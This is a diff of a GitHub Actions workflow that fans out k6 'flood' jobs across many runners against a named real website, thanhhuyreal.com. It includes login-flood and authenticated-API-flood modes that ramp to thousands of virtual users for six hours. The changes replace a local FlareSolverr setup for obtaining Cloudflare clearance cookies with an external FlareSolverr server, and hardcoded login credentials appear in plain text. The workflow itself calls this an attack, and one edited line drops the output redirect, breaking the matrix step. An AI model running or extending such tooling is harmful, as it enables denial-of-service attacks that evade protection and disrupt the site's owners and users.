@@ -34,7 +34,7 @@ jobs:
         run: |
           COUNT=${{ github.event.inputs.runners }}
           MATRIX=$(python3 -c "import json; print(json.dumps(list(range(1, int('$COUNT')+1))))")
-          echo "matrix=$MATRIX" >> $GITHUB_OUTPUT
+          echo "matrix=$GITHUB_OUTPUT"
 
   flood:
     needs: prepare
@@ -57,83 +57,14 @@ jobs:
       - name: Tang ulimit
         run: ulimit -n 131072 || true
 
-      - name: Setup FlareSolverr (auto Cloudflare bypass)
+      - name: Test FlareSolverr connectivity
         run: |
-          echo "Installing FlareSolverr..."
-          docker run -d \
-            --name flaresolverr \
-            -p 8191:8191 \
-            -e LOG_LEVEL=info \
-            ghcr.io/flaresolverr/flaresolverr:latest
-          
-          echo "Waiting for FlareSolverr to start..."
-          for i in {1..30}; do
-            if curl -sf http://localhost:8191/health > /dev/null; then
-              echo "FlareSolverr ready!"
-              break
-            fi
-            echo "Waiting... ($i/30)"
-            sleep 2
-          done
-
-      - name: Get initial cf_clearance
-        id: get_cookie
-        run: |
-          echo "Getting cf_clearance from FlareSolverr..."
-          
-          RESPONSE=$(curl -s -X POST http://localhost:8191/v1 \
-            -H "Content-Type: application/json" \
-            -d '{
-              "cmd": "request.get",
-              "url": "https://thanhhuyreal.com",
-              "maxTimeout": 60000
-            }')
-          
-          echo "FlareSolverr response:"
-          echo "$RESPONSE" | jq '.' || echo "$RESPONSE"
-          
-          # Check if response is successful
-          STATUS=$(echo "$RESPONSE" | jq -r '.status // "error"')
-          if [ "$STATUS" != "ok" ]; then
-            echo "ERROR: FlareSolverr failed"
-            echo "Status: $STATUS"
-            echo "Message: $(echo "$RESPONSE" | jq -r '.message // "unknown"')"
+          echo "Testing FlareSolverr server..."
+          curl -sf https://fs.duongle.dev/health || {
+            echo "ERROR: Cannot reach FlareSolverr server"
             exit 1
-          fi
-          
-          # Extract cookie
-          CF_CLEARANCE=$(echo "$RESPONSE" | jq -r '.solution.cookies[]? | select(.name=="cf_clearance") | .value // empty')
-          CF_UA=$(echo "$RESPONSE" | jq -r '.solution.userAgent // "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Safari/537.36"')
-          
-          if [ -z "$CF_CLEARANCE" ]; then
-            echo "ERROR: cf_clearance not found in response"
-            echo "Available cookies:"
-            echo "$RESPONSE" | jq -r '.solution.cookies[]?.name // "none"'
-            
-            # Try without Cloudflare (maybe site doesn't have challenge)
-            echo "Attempting direct access without cf_clearance..."
-            CF_CLEARANCE="none"
-            CF_UA="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Safari/537.36"
-          fi
-          
-          echo "cf_clearance=${CF_CLEARANCE}" >> $GITHUB_OUTPUT
-          echo "cf_ua=${CF_UA}" >> $GITHUB_OUTPUT
-          
-          if [ "$CF_CLEARANCE" != "none" ]; then
-            echo "✓ Got cf_clearance: ${CF_CLEARANCE:0:50}... (${#CF_CLEARANCE} chars)"
-          else
-            echo "⚠ No cf_clearance needed (no Cloudflare challenge)"
-          fi
-          
-          echo "User-Agent: ${CF_UA:0:80}..."
-
-      - name: Start cookie auto-refresh daemon
-        run: |
-          echo "Cookie auto-refresh: k6 uses initial cookie from env var"
-          echo "For tests >30min, workflow should be re-run with fresh cookie"
-          echo "Note: k6 cannot dynamically read files, so cookie refresh daemon is disabled"
-          echo ""
-          echo "Initial cookie will be valid for ~30 minutes"
+          }
+          echo "✓ FlareSolverr server is reachable"
 
       - name: Runner info
         run: |
@@ -142,8 +73,7 @@ jobs:
           echo "Public IP   : $(curl -sf https://api.ipify.org || echo unknown)"
           echo "CPU cores   : $(nproc)"
           echo "RAM free    : $(free -m | awk '/Mem:/{print $4}') MB"
-          echo "cf_clearance: $(cat /tmp/cf_clearance.txt | cut -c1-50)..."
-          echo "User-Agent  : $(cat /tmp/cf_ua.txt | cut -c1-80)..."
+          echo "FlareSolverr: https://fs.duongle.dev"
 
       # ─────────────────────────────────────────────────────────────
       # MODE: login_flood — Login flood qua Cloudflare
@@ -156,8 +86,7 @@ jobs:
           PHP_LOGIN_PATH:    "/model/login"
           PHP_IDENTIFIER:    "lonussystem"
           PHP_PASSWORD:      "lonussystem123@"
-          CF_CLEARANCE:      ${{ steps.get_cookie.outputs.cf_clearance }}
-          CF_UA:             ${{ steps.get_cookie.outputs.cf_ua }}
+          FLARESOLVERR_URL:  "https://fs.duongle.dev"
           PHP_FRESH_SESSION: "true"
           STAGES:            ${{ github.event.inputs.stages || '30s:50,60s:200,60s:500,360m:500' }}
           START_RATE:        "20"
@@ -171,7 +100,6 @@ jobs:
         run: |
           ulimit -n 131072 || true
           echo "Starting login flood attack..."
-          echo "CF_CLEARANCE: ${CF_CLEARANCE:0:50}..."
           k6 run --no-usage-report sites/thanhhuyreal/test-script-login.js
 
       # ─────────────────────────────────────────────────────────────
@@ -184,8 +112,7 @@ jobs:
           SITE_HOST:         "thanhhuyreal.com"
           PHP_IDENTIFIER:    "lonussystem"
           PHP_PASSWORD:      "lonussystem123@"
-          CF_CLEARANCE:      ${{ steps.get_cookie.outputs.cf_clearance }}
-          CF_UA:             ${{ steps.get_cookie.outputs.cf_ua }}
+          FLARESOLVERR_URL:  "https://fs.duongle.dev"
           STAGES:            ${{ github.event.inputs.stages || '30s:200,60s:1000,60s:3000,360m:3000' }}
           START_RATE:        "50"
           PRE_VUS:           "300"
@@ -195,25 +122,12 @@ jobs:
         run: |
           ulimit -n 131072 || true
           echo "Starting authenticated API flood..."
-          echo "CF_CLEARANCE: ${CF_CLEARANCE:0:50}..."
+          echo "FlareSolverr: https://fs.duongle.dev"
           k6 run --no-usage-report sites/thanhhuyreal/test-script-auth.js
 
       - name: Cleanup
         if: always()
-        run: |
-          if [ -f /tmp/cookie-refresh.pid ]; then
-            echo "Stopping cookie refresh daemon..."
-            kill $(cat /tmp/cookie-refresh.pid) 2>/dev/null || true
-          fi
-          
-          echo "Stopping FlareSolverr..."
-          docker stop flaresolverr 2>/dev/null || true
-          docker rm flaresolverr 2>/dev/null || true
-          
-          if [ -f /tmp/cookie-refresh.log ]; then
-            echo "=== Cookie Refresh Log ==="
-            tail -n 50 /tmp/cookie-refresh.log
-          fi
+        run: echo "No cleanup needed - using external FlareSolverr"
 
       - name: Upload logs (if failed)
         if: failure()
@@ -222,5 +136,4 @@ jobs:
           name: k6-results-runner-${{ matrix.runner }}
           path: |
             /tmp/k6-*.log
-            /tmp/cookie-refresh.log
           retention-days: 7
